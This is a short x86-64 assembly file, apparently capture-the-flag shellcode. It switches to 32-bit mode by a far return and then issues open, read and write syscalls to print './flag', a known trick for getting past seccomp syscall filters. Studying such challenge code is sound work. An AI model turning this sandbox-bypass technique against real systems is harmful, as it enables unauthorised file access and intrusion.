    .intel_syntax noprefix
    .code64
    .text
    .globl show_flag
show_flag:
    mov eax,offset .orw
    mov rbx,0x2300000000
    xor rax,rbx
    push rax
    retf 
.orw:
    xor eax,eax
    mov al, 0x5
    lea ebx, [.fileName]
    xor ecx,ecx
    xor edx,edx
    int 0x80
    mov ebx,eax
    mov al, 3
    lea ecx,[buf]
    mov edx,0x50
    int 0x80
    mov al,4
    mov ebx, 1
    int 0x80

.data
.fileName: .asciz  "./flag"
buf: .space 0x50
